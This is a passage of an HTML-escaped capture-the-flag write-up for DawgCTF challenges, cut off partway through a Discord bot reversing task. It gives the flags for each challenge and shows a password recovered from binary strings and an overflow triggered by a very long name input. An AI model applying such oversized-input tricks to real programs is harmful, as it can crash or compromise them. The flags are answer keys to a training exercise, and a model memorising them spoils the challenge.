&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;GCC: (GNU) 8.5.0 20210514 (Red Hat 8.5.0-16)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;3p1067
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;supers3cr3tpassword&lt;&#x2F;code&gt; got my eyes. Normally I started running the binary file and it prompted for password and I used &lt;code&gt;supers3cr3tpassword&lt;&#x2F;code&gt; and it resulted the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;strings$.&#x2F;secrets 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; the password: supers3cr3tpassword
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; did it!
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; flag is: DawgCTF{str1ng5_w1ng5}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{str1ng5_w1ng5}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;hello-world&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#hello-world&quot; aria-label=&quot;Anchor link for: hello-world&quot;&gt;Hello World?&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_helloworld.png&quot; alt=&quot;hello&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1bYhjapu2xvJhbvwpc0VReuOC64uSkEHv&quot; target=_blank&gt;HelloWorld&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;They said the program workd for any name! I thought that what about if the name is toooo long.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;helloworld$&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;HelloWorld
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;What&lt;&#x2F;span&gt;&lt;span&gt; is Your Name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DawgCTF{n4m3_0v3rfl0w&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;thought --&amp;gt; flag&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{n4m3_0v3rfl0w}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev&quot; aria-label=&quot;Anchor link for: rev&quot;&gt;Rev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;dm-bot&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#dm-bot&quot; aria-label=&quot;Anchor link for: dm-bot&quot;&gt;DM Bot!&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_dmbot1.png&quot; alt=&quot;DM&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1X1oZRNJ1tRWBDn__Z0IGrpzkjZ8z4THp&quot; target=_blank&gt;unclaimed_bot.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The unclaimed_bot.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;discord
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    client &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;discord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Client&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;intents&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;discord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Intents&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;event
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;async def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;on_ready&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;We have logged in as &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{0.user}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(client))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    klist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFkaX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bpc2NpbmcgZWxpdCwgc2VkIGRvIGVpdXNtb2QgdGVtcG9yIGluY2lkaWR1bnQgdXQgbGFib3JlIGV0IGRvbG9yZSBtYWduYSBhbGlxdWEuIFVybmEgY29uZGltZW50dW0gbWF0dGlzIHBlbGxlbnRlc3F1ZSBpZCBuaWJoIHRvcnRvciBpZCBhbGlxdWV0LiBGYW==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NpbGlzaXMgbWFnbmEgZXRpYW0gdGVtcG9yIG9yY2kgZXUH607JkNwW8rNqyEwI0KsHSXavqGb3iXl0PnPvpa72f8=uIFNhcGllbiBldCBsaWd1bGEgdWxsYW1jb3JwZXIgbWFsZXN1YWRhLiBUcmlzdGlxdWUgbnVsbGE&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;gYWxpcXVldCBlbmltIHRvcnRvciBhdC4gUXVpcyByaXN1cb&amp;#39;kpXpSMY0j53jg-b-WFChVOmcn5r20RktR66SB3_BYwE=&amp;#39;yBzZWQgdnVscHV0YXRlIG9kaW8uIFNhZ2l0dGlzIGFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;IGFyY3Ugdml0YWUgZWxlbWRGF3Z0NURns1dDR0MWNfMHJfZHluNG0xYz99VudHVtIGN1cmFiaXR1ci4gSGFiaXRhc3NlIHBsYXRlYSBkaWN0dW1zdCBxdW=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;lzcXVlIHNhZ2l0dGlzIHB1cnVzIHNpdCBhbWV0LiBQdXJ1cyBncmF2aWRhIHF1aXMgYmxhbmRpdCB0dXJwaXMgY3Vyc3VzIGluIGhhYyBoYWJpdGFzc2UuIFZvbHV0cGF0IGFjIHRpbmNpZHVudCB2aXRhZSBzZW1wZXIuIFF1YW0gZWxlbWVudHVtIHB1b==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HZpbmFyIGV0aWFtIG5vbiBxdWFtIGxhY3VzLiBBbWV0IHRlbGx1cyBjcmFzIGFkaXBpc2NpbmcgZW5pbSBldSB0dXJwaXMgZWdlc3Rhcy4KCkZldWdpYXQgbmlzbCBwcmV0aXVtIGZ1c2NlIGlkIHZlbGl0IHV0IHRvcnRvciBwcmV0aXVtIHZpdmVycmEuIEVuaW0gZGlhbSB2dWxwdXRhdGUgdXQgcGhhcmV0cmEgc2l0IGFtZ&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;XQuIEZldWdpYXQgcHJldGl1bSBuaWJoIGlwc3VtIGNvbnNlcXVhdCBuaXNsLiBCaWJlbmR1bSB1dCB0cmlzdGlxdWUgZXQgZWdlc3RhcyBxdWlzIGlwc3VtIHN1c3BlbmRpc3NlIHVsdHJpY2VzLiBWaXZlcnJhIGlwc3VtIG51bmMgYWxpcXVldCBi&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;aWJlbmR1bSBlbmltIGZhY2lsaXNpcyBncmF2aWRhIG5lcXVlLiBDb25zZWN0ZXR1ciBhZGlwaXNjaW5nIGVsaXQgdXQgYWxpcXVhbSBwdXJ1cyBzaXQgYW1ldCBsdWN0dXMuIEVyYXQgdmVsaXQgc2NlbG&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VyaXNxdWUgaW4gZGljdHVtIG5vbiBjb25zZWN0ZXR1ciBhIGVyYXQuIERpYW0gc29sbGljaXR1ZGluIHRlbXBvciBpZCBldSBuaXNsIG51bmMgbWkgaXBzdW0uIFJpc3VzIHF1aXMgdmFyaXVzIHF1YW0gcXVpc3F1ZSBpZCBkaWFtIHZlbCBxdWFtIGV&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;sZW1lbnR1bS4gUG9zdWVyZSBsb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCBjb25zZWN0ZXR1ci4gVWxsYW1jb3JwZXIgbW9yYmkgdGluY2lkdW50IG9ybmFyZSBtYXNzYS4gUXVhbSBhZGlwaXNjaW5nIHZpdGFlIHByb2luIHNhZ2l0dGlzIG5pc2wgcmhvbmN1cy4gRXUgY29uc2VxdWF0IGFjIGZlbGlzIGRvbmVjIGV0IG9kaW8gcGVsbGVudGVzcX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VlIGRpYW0gdm9sdXRwYXQuIEV0IG1hZ25pcyBkaXMgcGFydHVyaWVudCBtb250ZXMgbmFzY2V0dXIuIEFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVtIGFyY3Ugdml0YWUuIEluIG51bGxhIHBvc3VlcmUgc29sbGljaXR1ZGluIGFsaXF1YW0u&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    mlist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFkaX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bpc2NpbmcgZWxpdCwgc2VkIGRvIGVpdXNtb2QgdGVtcG9yIGluY2lkaWR1bnQgdXQgbGFib3JlIGV0IGRvbG9yZSBtYWduYSBhbGlxdWEuIFVybmEgY29uZGltZW50dW0gbWF0dGlzIHBlbGxlbnRlc3F1ZSBpZCBuaWJoIHRvcnRvciBpZCBhbGlxdWV0LiBGYW==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NpbGlzaXMgbWFnbmEgZXRpYW0gdGVtcG9yIG9yY2kgZXUH607Jb&amp;#39;gAAAAABkQfn3TpdZBGFeG4VfZObYKIL3f25CVBupi27swEARiUnK6c6ry6951JgI9lPqbPa3MkJ0Yg5huinb6_SNoTVZp1wdvYiIo3QZd-qb1p-nDsOeX_I=&amp;#39;kNwW8rNqyEwI0KsHSXavqGb3iXl0PnPvpa72f8=uIFNhcGllbiBldCBsaWd1bGEgdWxsYW1jb3JwZXIgbWFsZXN1YWRhLiBUcmlzdGlxdWUgbnVsbGE&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;gYWxpcXVldCBlbmltIHRvcnRvciBhdC4gUXVpcyByaXN1ckpXpSMY0j53jg-b-WFChVOmcn5r20RktR66SB3_BYwE=yBzZWQgdnVscHV0YXRlIG9kaW8uIFNhZ2l0dGlzIGFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;IGFyY3Ugdml0YWUgZWxlbWRGF3Z0NURns1dDR0MWNfMHJfZHluNG0xYz99VudHVtIGN1cmFiaXR1ci4gSGFiaXRhc3NlIHBsYXRlYSBkaWN0dW1zdCBxdW=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;lzcXVlIHNhZ2l0dGlzIHB1cnVzIHNpdCBhbWV0LiBQdXJ1cyBncmF2aWRhIHF1aXMgYmxhbmRpdCB0dXJwaXMgY3Vyc3VzIGluIGhhYyBoYWJpdGFzc2UuIFZvbHV0cGF0IGFjIHRpbmNpZHVudCB2aXRhZSBzZW1wZXIuIFF1YW0gZWxlbWVudHVtIHB1b==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HZpbmFyIGV0aWFtIG5vbiBxdWFtIGxhY3VzLiBBbWV0IHRlbGx1cyBjcmFzIGFkaXBpc2NpbmcgZW5pbSBldSB0dXJwaXMgZWdlc3Rhcy4KCkZldWdpYXQgbmlzbCBwcmV0aXVtIGZ1c2NlIGlkIHZlbGl0IHV0IHRvcnRvciBwcmV0aXVtIHZpdmVycmEuIEVuaW0gZGlhbSB2dWxwdXRhdGUgdXQgcGhhcmV0cmEgc2l0IGFtZ&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;XQuIEZldWdpYXQgcHJldGl1bSBuaWJoIGlwc3VtIGNvbnNlcXVhdCBuaXNsLiBCaWJlbmR1bSB1dCB0cmlzdGlxdWUgZXQgZWdlc3RhcyBxdWlzIGlwc3VtIHN1c3BlbmRpc3NlIHVsdHJpY2VzLiBWaXZlcnJhIGlwc3VtIG51bmMgYWxpcXVldCBi&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;aWJlbmR1bSBlbmltIGZhY2lsaXNpcyBncmF2aWRhIG5lcXVlLiBDb25zZWN0ZXR1ciBhZGlwaXNjaW5nIGVsaXQgdXQgYWxpcXVhbSBwdXJ1cyBzaXQgYW1ldCBsdWN0dXMuIEVyYXQgdmVsaXQgc2NlbG&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VyaXNxdWUgaW4gZGljdHVtIG5vbiBjb25zZWN0ZXR1ciBhIGVyYXQuIERpYW0gc29sbGljaXR1ZGluIHRlbXBvciBpZCBldSBuaXNsIG51bmMgbWkgaXBzdW0uIFJpc3VzIHF1aXMgdmFyaXVzIHF1YW0gcXVpc3F1ZSBpZCBkaWFtIHZlbCBxdWFtIGV&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;sZW1lbnR1bS4gUG9zdWVyZSBsb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCBjb25zZWN0ZXR1ci4gVWxsYW1jb3JwZXIgbW9yYmkgdGluY2lkdW50IG9ybmFyZSBtYXNzYS4gUXVhbSBhZGlwaXNjaW5nIHZpdGFlIHByb2luIHNhZ2l0dGlzIG5pc2wgcmhvbmN1cy4gRXUgY29uc2VxdWF0IGFjIGZlbGlzIGRvbmVjIGV0IG9kaW8gcGVsbGVudGVzcX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VlIGRpYW0gdm9sdXRwYXQuIEV0IG1hZ25pcyBkaXMgcGFydHVyaWVudCBtb250ZXMgbmFzY2V0dXIuIEFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVtIGFyY3Ugdml0YWUuIEluIG51bGxhIHBvc3VlcmUgc29sbGljaXR1ZGluIGFsaXF1YW0u&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    blist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;YzNSbmMyUnlaMlJoWm1kbVJsZEdWMFJFUkVaWFpIZG1Da1pGUmtWSFptUmxaM0puUmtWR1JVZG1aR1ZuY21kemR3cEdSVVpGUjJaa1pXZHlaM04zUmtSRlIwWkhaM05uWkdnS1pXZHlaMFpIVjBaRVJVZEdSMmR6WjJSb1JuTjNSa1JGQ25KblpHVmxSMFpIWjNObmMyVmxSMFpIWjNOblpHaEdjd3BuYzJka2FFVkdSVWRtWkdWbmNrWkdaM05uWkdoeVoyUUtaR1ZuY2taR1ozTm5aR2h5WjJSbFpVZEdSMmRuWkdoeUNtUm9SVVpGUjJaeloyUm9Sbk4zUmtSRlpHZG5kMFpFUlFweVoyUmxaVWRHUjJkelozTmxaVWRHUjJkeloyUm9Sbk1LWjNOblpHaEZSa1ZIWm1SbFozSkdSbWR6WjJSb2NtZGtDbkpuWkdWbFIwWkhaM05uYzJWbFIwWkhaM05uWkdoR2N3cG5jMmRrYUVWR1JVZG1aR1ZuY2taR1ozTm5aR2h5WjJRS1pHVm5ja1pHWjNOblpHaHlaMlJsWlVkR1IyZG5aR2h5Q21Sb1JVWkZSMlp6WjJSb1JuTjNSa1JGWkdkbmQwWkVSUXB5WjJSbFpVZEdSMmR6WjNObFpVZEdSMmR6WjJSb1JuTUtaM05uWkdoRlJrVkhabVJsWjNKR1JtZHpaMlJvY21ka0NtZHpaMlJvY21ka1pXVkhSa2RuYzJka2FFWnpkMFpFUlFweVoyUmxaVWRHUjJkeloyUm9aM05uWkdoR2MzZEdSRVVLY21ka1pXVkhSa2RsWlVkR1IyZHpaMlJvUm5OM1JrUkZDbkpuWkdWbFIwWkhaM05uWkdoRlJrVkhabVJsWjNKR1JncEVZWGRuUTFSR2Uwd3pORkpPWDFRd1gwUXpVRXd3V1gwS2NtZGtaV1ZIUmtkbmMyZGthRVZHUlVkSFJrZG5jMmRrQ25KblpHVmxSMFpIWjNOblpHaEhjMmRrYUVaemQwWkVSUXB5WjJSbFpVZEdSMmR6WjNObFpVZEdSMmR6WjJSb1JuTUtaM05uWkdoRlJrVkhabVJsWjNKR1JtZHpaMlJvY21ka0NtUmxaM0pHUm1keloyUm9jbWRrWldWSFJrZG5aMlJvY2dwa2FFVkdSVWRtYzJka2FFWnpkMFpFUldSblozZEdSRVVLWm1SbFozSkdSbWR6WjJSb2NtZGtaV1ZIUmtkblJVWkZDbVprWldkeVJrWm5jMmRrYUhKblpHVmxhRVp6ZDBaRVJRcHlaMlJsWlVkR1IyZHpaM05sWlVkR1IyZHpaMlJvUm5NS1ozTm5aR2hGUmtWSFptUmxaM0pHUm1keloyUm9jbWRrQ21SbFozSkdSbWR6WjJSb2NtZGtaV1ZIUmtkbloyUm9jZ3BrYUVWR1JVZG1jMmRrYUVaemQwWkVSV1JuWjNkR1JFVUtjbWRrWldWSFJrZG5jMmR6WldWSFJrZG5jMmRrYUVaekNtZHpaMlJvUlVaRlIyWmtaV2R5UmtabmMyZGthSEpuWkFweVoyUmxaVWRHUjJkelozTmxaVWRHUjJkeloyUm9Sbk1LWjNOblpHaEZSa1ZIWm1SbFozSkdSbWR6WjJSb2NtZGtDbVJsWjNKR1JtZHpaMlJvY21ka1pXVkhSa2RuWjJSb2NncGthRVZHUlVkbWMyZGthRVp6ZDBaRVJXUm5aM2RHUkVVS2NtZGtaV1ZIUmtkbmMyZHpaV1ZIUmtkbmMyZGthRVp6Q21keloyUm9SVVpGUjJaa1pXZHlSa1puYzJka2FISm5aQXBrWldkeVJrWm5jMmRrYUhKblpHVmxSMFpIWjJka2FISUtaR2hGUmtWSFpuTm5aR2hHYzNkR1JFVmtaMmQzUmtSRg==&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;event
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;async def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;on_message&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;message&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;author &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;user:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return
&lt;&#x2F;span&gt;&lt;span&gt;        
